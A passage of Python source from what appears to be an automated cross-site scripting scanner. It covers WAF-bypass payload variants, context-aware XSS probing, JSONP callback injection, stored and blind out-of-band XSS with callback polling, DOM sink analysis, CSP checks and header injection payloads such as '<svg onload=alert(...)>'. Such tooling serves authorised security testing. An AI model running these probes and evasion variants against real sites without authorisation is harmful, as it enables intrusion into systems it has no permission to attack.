            if ch.isalpha() or ch == "-":
                j = i
                while j < n and (prefix[j].isalnum() or prefix[j] in "-_"):
                    j += 1
                last_attr = prefix[i:j].lower()
                i = j
                continue
            i += 1
            continue

        if prefix.startswith("<!--", i):
            in_comment = True
            i += 4
            continue
        if prefix.startswith("<script", i):
            in_script = True
            i += 7
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<style", i):
            in_script = True
            in_style = True
            i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<textarea", i):
            in_raw_text = "textarea"
            i += 9
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<title", i):
            in_raw_text = "title"
            i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if ch == "<":
            in_tag = True
            last_attr = ""
            i += 1
            j = i
            while j < n and (prefix[j].isalnum() or prefix[j] in "-:"):
                j += 1
            i = j
            continue
        i += 1

    if in_comment:
        return "html_comment"
    if in_raw_text:
        return in_raw_text
    if in_script and in_style:
        return "css"
    if in_script:
        if in_js_string == "`":
            return "script_template"
        if in_js_string == "'":
            return "script_string_single"
        if in_js_string == '"':
            return "script_string_double"
        return "script_bare"
    if in_tag:
        if quote == '"':
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_double"
        if quote == "'":
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_single"
        return "attr_unquoted"

    return "html_body"


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — ENCODING ANALYSIS (with type reporting)
# ═════════════════════════════════════════════════════════════════════════════

def analyze_encoding(
    body: str, index: int, payload: str,
) -> tuple[list[str], list[str], list[str]]:
    """
    Returns (encoded_chars, survived_chars, encoding_types).

    `encoding_types` is a list of human labels like 'entity_decimal',
    'url_encoded', 'js_escape'. Useful for the retest note in evidence.
    """
    if index < 0:
        return [], [], []

    window = body[max(0, index - 50): index + len(payload) + 50]
    encoded: list[str] = []
    survived: list[str] = []
    types: set[str] = set()

    for ch in ENCODING_CHARS:
        if ch not in payload:
            continue
        if ch in window:
            survived.append(ch)
        for etype, forms in ENCODED_FORMS_BY_TYPE.items():
            form = forms.get(ch)
            if form and form.lower() in window.lower():
                encoded.append(ch)
                types.add(etype)
                break

    return encoded, survived, sorted(types)


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — WAF BYPASS VARIANTS
# ═════════════════════════════════════════════════════════════════════════════

def _waf_variants(payload: str) -> list[tuple[str, str]]:
    variants: list[tuple[str, str]] = []

    mixed = re.sub(
        r"\b(svg|img|script|alert|onload|onerror|onmouseover|onfocus)\b",
        lambda m: "".join(c.upper() if i % 2 else c.lower()
                          for i, c in enumerate(m.group(0))),
        payload, flags=re.I,
    )
    if mixed != payload:
        variants.append((mixed, "case_mix"))

    variants.append((urllib.parse.quote(payload, safe=""), "url_encode"))
    variants.append(
        (urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
         "double_url_encode")
    )

    # HTML-entity quotes — surviving WAF regex on "<script>" but breaking
    # attribute boundaries.
    ent_q = payload.replace('"', "&#34;").replace("'", "&#39;")
    if ent_q != payload:
        variants.append((ent_q, "entity_quotes"))

    # Hex-entity quotes
    hex_q = payload.replace('"', "&#x22;").replace("'", "&#x27;")
    if hex_q != payload:
        variants.append((hex_q, "hex_entity_quotes"))

    uni = payload.replace("a", "\\u0061").replace("l", "\\u006c").replace("e", "\\u0065")
    if uni != payload:
        variants.append((uni, "unicode_escape"))

    # \u{...} codepoint form (ES6 — bypasses some JS-context WAFs)
    ucode = payload.replace("a", "\\u{61}").replace("l", "\\u{6c}")
    if ucode != payload:
        variants.append((ucode, "unicode_codepoint"))

    nl = payload.replace(" ", "%0a")
    if nl != payload:
        variants.append((nl, "newline_inject"))

    nnull = payload.replace(" ", "%00")
    if nnull != payload:
        variants.append((nnull, "null_byte"))

    bt = payload.replace('="', "=`").replace('"', "`")
    if bt != payload:
        variants.append((bt, "backtick_attr"))

    cb = payload.replace("<svg", "<svg/**/").replace("<img", "<img/**/")
    if cb != payload:
        variants.append((cb, "comment_break"))

    slash = payload.replace("<svg ", "<svg/").replace("<img ", "<img/")
    if slash != payload:
        variants.append((slash, "slash_separator"))

    tab = payload.replace("<svg ", "<svg%09").replace("<img ", "<img%09")
    if tab != payload:
        variants.append((tab, "whitespace_tab"))

    ff = payload.replace("<svg ", "<svg%0c").replace("<img ", "<img%0c")
    if ff != payload:
        variants.append((ff, "whitespace_formfeed"))

    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3+4 — CONTEXT-AWARE PAYLOAD TESTING
# ═════════════════════════════════════════════════════════════════════════════

def test_context_payloads(
    session: Session, surface: dict, baseline: Baseline, context: str,
) -> list[XSSFinding]:
    findings: list[XSSFinding] = []

    # Content-type override: an SVG/XML response uses its own payload set.
    ct_kind = _content_type_kind(baseline.content_type)
    effective_context = context
    if ct_kind == "svg" and context in ("html_body", "unknown"):
        effective_context = "svg"
    elif ct_kind == "xml" and context in ("html_body", "unknown"):
        effective_context = "xml"

    payloads = (
        CONTEXT_PAYLOADS.get(effective_context) or CONTEXT_PAYLOADS["unknown"]
    )[:MAX_CONTEXT_PAYLOADS]

    sent: set[str] = set()

    for template in payloads:
        marker = _new_marker()
        payload = template.format(m=marker)
        if payload in sent:
            continue
        sent.add(payload)

        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue

        body = _body(resp)
        idx = body.find(payload)

        if idx >= 0:
            encoded, survived, enc_types = analyze_encoding(body, idx, payload)
            executable = (
                "(" in survived and ")" in survived
                and any(c in survived for c in ("<", '"', "'", "`"))
            )
            findings.append(XSSFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                xss_type="reflected", context=context,
                severity="CRITICAL" if executable else "HIGH",
                confidence=92 if executable else 70,
                confirmed=executable,
                payload=payload, marker=marker,
                evidence=(
                    f"Payload survived UNENCODED in {context} context — "
                    f"survived: {''.join(survived) or '(none)'}"
                    + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")
                ),
                encoded_chars=encoded, survived_chars=survived,
                http_status=resp.status_code,
                details={
                    "reflection_index": idx, "context": context,
                    "content_type": baseline.content_type,
                    "executable": executable,
                    "encoding_types": enc_types,
                    "body_snippet": body[max(0, idx - 80): idx + len(payload) + 80],
                },
            ))
            return findings

        midx = body.find(marker)
        if midx >= 0:
            encoded, survived, enc_types = analyze_encoding(body, midx, payload)
            findings.append(XSSFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                xss_type="reflected", context=context,
                severity="MEDIUM", confidence=55, confirmed=False,
                payload=payload, marker=marker,
                evidence=(
                    f"Marker reflected in {context} but payload was filtered/modified"
                    + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")
                ),
                encoded_chars=encoded, survived_chars=survived,
                http_status=resp.status_code,
                details={"body_snippet": body[max(0, midx - 80): midx + 120],
                         "encoding_types": enc_types},
            ))
            return findings

        if resp.status_code in WAF_BLOCK_STATUSES:
            time.sleep(min(2.0, max(0.0, (baseline.median_time * 2) - REQUEST_SLEEP)))
            for variant, label in _waf_variants(payload):
                v_resp = _probe(session, surface, variant)
                time.sleep(REQUEST_SLEEP)
                if v_resp is None or _looks_denied(v_resp):
                    continue
                v_body = _body(v_resp)
                v_midx = v_body.find(marker)
                if v_midx < 0:
                    continue
                actual_ctx = classify_context(v_body, v_midx)
                if actual_ctx != context and context != "unknown":
                    continue
                encoded, survived, enc_types = analyze_encoding(
                    v_body, v_midx, variant,
                )
                findings.append(XSSFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    xss_type="reflected", context=context,
                    severity="HIGH", confidence=80, confirmed=True,
                    payload=variant, marker=marker, bypass_used=label,
                    evidence=(
                        f"WAF bypass '{label}' reflected marker in "
                        f"{actual_ctx} context"
                    ),
                    encoded_chars=encoded, survived_chars=survived,
                    http_status=v_resp.status_code,
                    details={
                        "original_payload": payload,
                        "variant": variant,
                        "actual_context": actual_ctx,
                        "encoding_types": enc_types,
                    },
                ))
                return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  NEW — JSONP CALLBACK INJECTION
# ═════════════════════════════════════════════════════════════════════════════

def test_jsonp_injection(
    session: Session, surface: dict, baseline: Baseline,
) -> list[XSSFinding]:
    """
    JSONP endpoints reflect a `callback` (or similar) parameter verbatim,
    usually unquoted. That's a direct script-execution primitive on the
    target origin — functionally XSS-adjacent (classic JSON hijacking /
    "JSONP XSS").
    """
    p = surface["param"].lower()
    if not any(hint in p for hint in JSONP_PARAM_HINTS):
        return []

    marker = _new_marker()
    probe_payload = f"{marker}_cb"
    resp = _probe(session, surface, probe_payload)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return []

    body = _body(resp)
    # Classic JSONP: response starts with `<marker>_cb(` or similar
    if body.lstrip().startswith(probe_payload + "(") or \
       body.lstrip().startswith("/*") and probe_payload + "(" in body[:200]:
        return [XSSFinding(
            target=surface["url"], param=surface["param"],
            param_location=surface["location"],
            xss_type="reflected", context="jsonp",
            severity="HIGH", confidence=85, confirmed=True,
            payload=f"{probe_payload}",
            marker=marker,
            evidence=(
                f"JSONP callback parameter '{surface['param']}' reflected "
                f"unquoted at start of response — script-execution primitive"
            ),
            http_status=resp.status_code,
            details={
                "content_type": baseline.content_type,
                "body_prefix": body[:200],
                "attack_payload": (
                    f"{probe_payload};alert(document.domain);//"
                ),
            },
        )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — DOM XSS STATIC ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def _indentation(line: str) -> int:
    return len(line) - len(line.lstrip())


def analyze_dom_js(js_url: str, js_content: str, target_page: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    if not js_content:
        return findings

    # ── jQuery version check (CVE-2020-11022/11023 territory) ──────────────
    jq_m = re.search(
        r"jQuery[^\"'\n]*?v?(\d+)\.(\d+)\.(\d+)", js_content[:8000],
        re.IGNORECASE,
    )
    if jq_m:
        ver = (int(jq_m.group(1)), int(jq_m.group(2)), int(jq_m.group(3)))
        if ver < JQUERY_MIN_SAFE:
            findings.append(XSSFinding(
                target=target_page, param="(DOM)",
                xss_type="dom", context="dom",
                severity="MEDIUM", confidence=70, confirmed=False,
                payload=f"jQuery v{'.'.join(map(str, ver))}",
                evidence=(
                    f"jQuery {'.'.join(map(str, ver))} < "
                    f"{'.'.join(map(str, JQUERY_MIN_SAFE))} — "
                    "vulnerable to html()-with-user-input XSS chains"
                ),
                details={
                    "js_url": js_url, "jquery_version": ver,
                    "cve_hints": ["CVE-2020-11022", "CVE-2020-11023"],
                },
            ))

    lines = js_content.splitlines()
    source_lines: dict[str, list[int]] = {}
    sink_lines: dict[str, list[int]] = {}

    for i, line in enumerate(lines):
        for src in DOM_SOURCES:
            if src in line:
                source_lines.setdefault(src, []).append(i)
        for sink in DOM_SINKS:
            if sink in line:
                sink_lines.setdefault(sink, []).append(i)

    if not source_lines or not sink_lines:
        return findings

    for src, src_positions in source_lines.items():
        for sink, sink_positions in sink_lines.items():
            matched = False
            for sp in src_positions:
                for kp in sink_positions:
                    if abs(sp - kp) > 15:
                        continue
                    if abs(_indentation(lines[sp]) - _indentation(lines[kp])) > 4:
                        continue
                    confidence = 75 if abs(sp - kp) <= 5 else 60
                    findings.append(XSSFinding(
                        target=target_page, param="(DOM)",
                        xss_type="dom", context="dom",
                        severity="HIGH" if confidence >= 75 else "MEDIUM",
                        confidence=confidence, confirmed=False,
                        payload=f"{src} → {sink}",
                        evidence=(
                            f"Source '{src}' flows to sink '{sink}' "
                            f"within {abs(sp - kp)} lines in {js_url}"
                        ),
                        details={
                            "js_url": js_url, "source": src, "sink": sink,
                            "source_line": sp + 1, "sink_line": kp + 1,
                            "snippet": lines[max(0, min(sp, kp) - 2): max(sp, kp) + 3],
                        },
                    ))
                    matched = True
                    break
                if matched:
                    break

    return findings


def run_dom_analysis(session: Session, outdir: Path) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    js_urls: list[str] = []

    for name in ("urls_js_files.txt", "js_files.txt"):
        p = outdir / name
        if p.exists():
            for line in p.read_text().splitlines():
                url = line.strip().split()[0] if line.strip() else ""
                if url and url.endswith(".js") and url not in js_urls:
                    js_urls.append(url)
                    if len(js_urls) >= MAX_DOM_FILES:
                        break
        if len(js_urls) >= MAX_DOM_FILES:
            break

    if not js_urls:
        return findings

    log.info(f"    DOM analysis: {len(js_urls)} JS file(s)")

    for js_url in js_urls:
        resp = session.get(js_url, timeout=15)
        time.sleep(REQUEST_SLEEP)
        if resp is None or resp.status_code >= 400:
            continue
        content = _body(resp)
        if not content:
            continue
        findings.extend(analyze_dom_js(js_url, content, js_url))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — STORED CANDIDATES
# ═════════════════════════════════════════════════════════════════════════════

def run_stored_candidates(
    session: Session, surface: dict, baseline: Baseline,
) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    marker = _new_marker()

    resp = _probe(session, surface, marker)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return findings

    parsed = urllib.parse.urlparse(surface["url"])
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in STORED_REVISIT_PATTERNS[:MAX_STORED_PAGES]:
        test_url = base + path
        r = session.get(test_url)
        time.sleep(REQUEST_SLEEP)
        if r is None or r.status_code >= 400:
            continue
        body = _body(r)
        idx = body.find(marker)
        if idx >= 0:
            context = classify_context(body, idx)
            findings.append(XSSFinding(
                target=test_url, param=surface["param"],
                param_location=surface["location"],
                xss_type="stored", context=context,
                severity="CRITICAL", confidence=80, confirmed=True,
                payload=marker, marker=marker,
                evidence=(
                    f"Injected marker reappeared on {test_url} "
                    f"after submission via {surface['param']}"
                ),
                details={
                    "injection_url": surface["url"],
                    "revisit_url": test_url,
                    "context": context,
                    "body_snippet": body[max(0, idx - 80): idx + 120],
                },
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — BLIND OOB (HUGINN-AWARE)
# ═════════════════════════════════════════════════════════════════════════════

def generate_blind_payloads(
    surface: dict, *, oob_base_url: str, oob_mode: str = "path",
) -> list[dict]:
    """
    Generate blind-XSS payloads with a Huginn-compatible 32-hex token.
    Returns [] if OOB is not configured.
    """
    if not oob_base_url:
        return []

    token = _new_huginn_token()
    client = HuginnClient(oob_base_url, verify_tls=False)  # OOB is user infra
    if oob_mode == "subdomain":
        oob_url = client.payload_url_subdomain(token)
    else:
        oob_url = client.payload_url_path(token)

    out: list[dict] = []
    for label, tmpl in BLIND_PAYLOAD_TEMPLATES:
        out.append({
            "target":     surface["url"],
            "param":      surface["param"],
            "location":   surface["location"],
            "oob_token":  token,
            "oob_url":    oob_url,
            "variant":    label,
            "payload":    tmpl.format(oob=oob_url),
        })
    return out


def blind_payloads_to_findings(blind_payloads: list[dict]) -> list[XSSFinding]:
    """Turn blind payloads into candidate findings so they land in findings[]."""
    by_token: dict[str, XSSFinding] = {}
    for b in blind_payloads:
        tok = b["oob_token"]
        if tok in by_token:
            continue
        by_token[tok] = XSSFinding(
            target=b["target"],
            param=b["param"],
            param_location=b.get("location", "query"),
            xss_type="blind",
            context="(oob)",
            severity="HIGH",
            confidence=60,       # upgraded to 99 on confirmation
            confirmed=False,
            payload=b["payload"],
            marker=tok,
            evidence=(
                f"Blind payload generated with OOB token {tok[:12]}… — "
                "awaiting callback. Deploy and run --verify-oob."
            ),
            details={
                "oob_url":    b["oob_url"],
                "oob_token":  tok,
                "variant":    b["variant"],
                "deployed":   False,
            },
        )
    return list(by_token.values())


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7b — OOB VERIFICATION
# ═════════════════════════════════════════════════════════════════════════════

def verify_blind_findings(
    outdir: Path, *,
    oob_base_url: str,
    read_key: Optional[str] = None,
    max_wait: int = 0,
    scan_id: Optional[int] = None,
) -> dict:
    """
    Poll Huginn for each token in xss_blind.txt (or in findings[] of
    xss_findings.json). Upgrade confirmed hits in place.

    max_wait=0 → single pass (no waiting).
    max_wait=N → poll each token for up to N seconds.

    Returns {polled, confirmed, misses}.
    """
    if not oob_base_url:
        return {"polled": 0, "confirmed": 0, "misses": 0, "error": "no OOB base_url"}

    json_path = outdir / "xss_findings.json"
    if not json_path.exists():
        log.warning("  OOB verify: xss_findings.json missing — skipping")
        return {"polled": 0, "confirmed": 0, "misses": 0, "error": "no report"}

    report = json.loads(json_path.read_text())
    findings = report.get("findings") or []

    # Collect unique tokens from blind findings (not yet confirmed)
    tokens: dict[str, list[dict]] = {}
    for f in findings:
        if f.get("xss_type") != "blind":
            continue
        if int(f.get("confirmed", 0)) == 1:
            continue
        tok = (f.get("details") or {}).get("oob_token") or f.get("marker")
        if not tok or not re.fullmatch(r"[a-f0-9]{16,}", tok):
            continue
        tokens.setdefault(tok, []).append(f)

    if not tokens:
        log.info("  OOB verify: no unconfirmed blind findings to poll")
        return {"polled": 0, "confirmed": 0, "misses": 0}

    log.info(
        f"  OOB verify: polling {len(tokens)} token(s) against {oob_base_url}"
        + (f" up to {max_wait}s each" if max_wait else " (single pass)")
    )

    client = HuginnClient(oob_base_url, read_key=read_key, verify_tls=False)
    hits: dict[str, dict] = {}
    misses = 0

    for tok in tokens:
        if max_wait > 0:
            result = client.poll_until_hit(tok, max_wait=max_wait)
        else:
            result = client.check_token(tok)
        if result.get("found"):
            hits[tok] = result
            n_entries = len(result.get("entries") or [])
            log.info(f"    ✔ {tok[:16]}…  {n_entries} callback(s)")
        else:
            misses += 1

    if not hits:
        log.info(f"    no callbacks yet — {misses} miss(es)")
        return {"polled": len(tokens), "confirmed": 0, "misses": misses}

    upgraded: list[dict] = []
    for f in findings:
        if f.get("xss_type") != "blind":
            continue
        tok = (f.get("details") or {}).get("oob_token") or f.get("marker")
        if tok not in hits:
            continue
        entries = hits[tok].get("entries") or []
        ip = entries[0].get("ip") if entries else "?"
        ts = entries[0].get("time") if entries else "?"
        ua = (entries[0].get("user_agent") or "?")[:60] if entries else "?"
        f["confirmed"]  = 1
        f["severity"]   = "CRITICAL"
        f["confidence"] = 99
        f["evidence"]   = (
            f"Blind XSS CONFIRMED via OOB callback — {len(entries)} hit(s); "
            f"first from IP {ip} at {ts} (UA: {ua})"
        )
        f.setdefault("details", {})["oob_confirmed"] = {
            "token":   tok,
            "entries": entries,
            "hit_count": len(entries),
        }
        upgraded.append(f)

    if upgraded:
        report["findings"] = findings
        totals = report.setdefault("totals", {})
        totals["confirmed"] = int(totals.get("confirmed", 0)) + len(upgraded)
        totals["blind_confirmed"] = len(upgraded)
        json_path.write_text(
            json.dumps(report, indent=2, ensure_ascii=False) + "\n"
        )
        log.info(f"    upgraded {len(upgraded)} blind finding(s) → CONFIRMED")

        if scan_id is not None:
            rebuilt = [_dict_to_finding(raw) for raw in upgraded]
            _self_sync(scan_id, rebuilt)

    return {"polled": len(tokens), "confirmed": len(upgraded), "misses": misses}


def _dict_to_finding(raw: dict) -> XSSFinding:
    """Inverse of XSSFinding.to_dict() — for re-syncing upgraded rows."""
    return XSSFinding(
        target=raw.get("target", ""),
        param=raw.get("param_name", ""),
        param_location=raw.get("param_location", "query"),
        xss_type=raw.get("xss_type", "blind"),
        context=raw.get("context", ""),
        severity=raw.get("severity", "MEDIUM"),
        confidence=int(raw.get("confidence", 0) or 0),
        confirmed=bool(int(raw.get("confirmed", 0) or 0)),
        payload=raw.get("payload", ""),
        marker=raw.get("marker", ""),
        evidence=raw.get("evidence", ""),
        bypass_used=raw.get("bypass_used", ""),
        encoded_chars=raw.get("encoded_chars") or [],
        survived_chars=raw.get("survived_chars") or [],
        http_status=int(raw.get("http_status", 0) or 0),
        auth_enabled=bool(int(raw.get("auth_enabled", 0) or 0)),
        first_seen=raw.get("first_seen", ""),
        details=raw.get("details") or {},
    )


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — CSP ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyze_csp(resp: requests.Response, target: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    if resp is None:
        return findings

    csp = resp.headers.get("Content-Security-Policy", "")
    csp_ro = resp.headers.get("Content-Security-Policy-Report-Only", "")

    if not csp and csp_ro:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity="INFO", confidence=90, confirmed=True,
            payload="", evidence="Only Report-Only CSP present — directives are NOT enforced",
            details={"header": "Content-Security-Policy-Report-Only",
                     "value": csp_ro[:500]},
        ))
        return findings

    if not csp:
        return findings

    lower = csp.lower()

    checks = [
        ("unsafe-inline", "HIGH",  "CSP allows 'unsafe-inline' — inline scripts execute"),
        ("unsafe-eval",   "HIGH",  "CSP allows 'unsafe-eval' — eval() and Function() execute"),
        ("script-src *",  "HIGH",  "script-src allows wildcard — any host can serve scripts"),
        ("script-src: *", "HIGH",  "script-src allows wildcard — any host can serve scripts"),
    ]
    for needle, sev, ev in checks:
        if needle in lower:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity=sev, confidence=85, confirmed=False,
                payload=needle, evidence=ev,
                details={"header": "Content-Security-Policy", "directive": needle},
            ))

    for host in CSP_BYPASS_HOSTS:
        if host in csp:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity="MEDIUM", confidence=70, confirmed=False,
                payload=f"script-src {host}",
                evidence=f"script-src allowlists {host} — JSONP endpoints bypass CSP",
                details={"header": "Content-Security-Policy",
                         "allowlisted_host": host},
            ))

    for missing in ("base-uri", "object-src"):
        if missing not in lower:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity="MEDIUM", confidence=70, confirmed=False,
                payload=f"missing {missing}",
                evidence=(
                    f"CSP does not set {missing} — "
                    + ("<base> tag injection redirects relative scripts" if missing == "base-uri"
                       else "plugin-based script execution possible")
                ),
                details={"header": "Content-Security-Policy", "directive": missing},
            ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — HEADER REFLECTION (opt-in)
# ═════════════════════════════════════════════════════════════════════════════

def test_header_injection(session: Session, host_url: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    for header in HEADER_INJECTION_VECTORS:
        marker = _new_marker()
        payload = f"<svg onload=alert('{marker}')>"
        resp = session.get(host_url, headers={header: payload})
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        idx = body.find(marker)
        if idx < 0:
            idx = body.find(payload)
            if idx < 0:
                continue
        context = classify_context(body, idx)
        findings.append(XSSFinding(
            target=host_url, param=f"(header:{header})",
            param_location="header",
            xss_type="header", context=context,
            severity="HIGH", confidence=75, confirmed=True,
            payload=payload, marker=marker,
            evidence=f"Header '{header}' reflected in {context} context",
            http_status=resp.status_code,
            details={
                "header": header, "context": context,
                "body_snippet": body[max(0, idx - 80): idx + 120],
            },
        ))
        return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: Session, surface: dict, *,
    test_stored: bool = True,
    oob_settings: Optional[dict] = None,
) -> tuple[Baseline, list[XSSFinding], Optional[dict]]:
    baseline = build_baseline(session, surface)

    # Content-type gate — skip probing binaries.
    if baseline.content_type and not _is_executable_content_type(baseline.content_type):
        return baseline, [], None

    reflection = probe_reflection(session, surface)
    if not reflection["reflected"]:
        # JSONP test even without reflection — the callback check is different.
        if oob_settings and oob_settings["mode"] != "disabled":
            pass  # JSONP is not blind — handled below regardless
        jsonp = test_jsonp_injection(session, surface, baseline)
        if jsonp:
            return baseline, jsonp, None
        return baseline, [], None

    marker = reflection["marker"]
    resp = _probe(session, surface, marker)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return baseline, [], None
    body = _body(resp)
    idx = body.find(marker)
    context = classify_context(body, idx) if idx >= 0 else "unknown"

    findings = test_context_payloads(session, surface, baseline, context)
    findings.extend(test_jsonp_injection(session, surface, baseline))

    if test_stored:
        findings.extend(run_stored_candidates(session, surface, baseline))

    blind_payloads: list[dict] = []
    if oob_settings and oob_settings["mode"] != "disabled":
        blind_payloads = generate_blind_payloads(
            surface,
            oob_base_url=oob_settings["base_url"],
            oob_mode=oob_settings["mode"],
        )

    return baseline, findings, {
        "marker": marker,
        "context": context,
        "unencoded": reflection["unencoded"],
        "blind_payloads": blind_payloads,
    }


# ═════════════════════════════════════════════════════════════════════════════
#  DB SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[XSSFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not importable")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB=False, skipping")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED=False, skipping")
        return
    if not getattr(DB, "available", False):
        log.warning("  DB sync: DB.available is False")
        return
    upsert = getattr(DB, "upsert_xss_findings", None)
    if upsert is None:
        log.error(
            "  DB sync: db.py is missing upsert_xss_findings(scan_id, rows). "
            "Add the method to sync findings into xss_findings."
        )
        return
    try:
        payloads = [f.to_dict() for f in findings]
        n = upsert(scan_id, payloads)
        if n is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {n} row(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.error(f"  DB sync: exception — {type(e).__name__}: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xss_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    oob_domain: Optional[str] = None,
    oob_mode: Optional[str] = None,
    test_stored: bool = True,
    test_dom: bool = True,
    test_headers: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    scan_id: Optional[int] = None,
    oob_poll_wait: int = 0,
) -> Path:
    start = time.monotonic()

    settings = _xss_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
    verify_tls  = settings["verify_tls"]

    # Resolve OOB — explicit kwargs beat config.
    oob = _oob_settings()
    if oob_domain:
        base = oob_domain if oob_domain.startswith(("http://", "https://")) \
               else f"https://{oob_domain}"
        oob["base_url"] = base.rstrip("/")
        oob["domain"]   = urllib.parse.urlparse(base).hostname or oob_domain
        oob["mode"]     = oob_mode or "huginn"
    if oob_mode:
        oob["mode"] = oob_mode

    urls = _load_urls(urls_file)
    if not urls:
        log.warning(f"  No URLs in {urls_file} — writing empty report")
        return _write_empty_report(outdir, urls_file, start)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]

    outdir.mkdir(parents=True, exist_ok=True)

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))
    seen_s: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen_s:
            seen_s.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  "
             f"timeout={eff_timeout}s  tls_verify={verify_tls}")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    log.info(f"  Modes  : stored={test_stored}  dom={test_dom}  "
             f"headers={test_headers}  oob={oob['mode']}")
    if oob["base_url"]:
        log.info(f"  OOB    : {oob['base_url']}  "
                 f"(mode={oob['mode']}, poll_wait={oob_poll_wait}s)")
    log.info("")

    limiter = SharedRateLimiter(eff_rate)
    session = Session(limiter, cfg_hdrs, eff_timeout, verify_tls=verify_tls)

    all_findings: list[XSSFinding] = []
    blind_payloads: list[dict] = []
    results: list[dict] = []
    waf_seen: dict[str, int] = {}

    def _process(surface: dict) -> tuple[dict, list[XSSFinding], Optional[dict]]:
        try:
            baseline, findings, reflection = audit_surface(
                session, surface,
                test_stored=test_stored,
                oob_settings=oob,
            )
            if baseline.waf:
                waf_seen[baseline.waf] = waf_seen.get(baseline.waf, 0) + 1
            return {
                "url": surface["url"], "param": surface["param"],
                "location": surface["location"],
                "method": surface.get("method", "GET"),
                "baseline": baseline.to_dict(),
                "reflection": reflection,
                "finding_count": len(findings),
            }, findings, reflection
        except Exception as e:
            log.debug(f"    error on {_redact_url(surface['url'])}: {e}")
            return {"url": surface["url"], "param": surface["param"],
                    "location": surface["location"],
                    "error": f"{type(e).__name__}: {e}"}, [], None

    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
    interrupted = False
    try:
        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
            futures = {pool.submit(_process, s): s for s in surfaces}
            done = 0
            for fut in as_completed(futures):
                done += 1
                try:
                    result, findings, reflection = fut.result()
                    results.append(result)
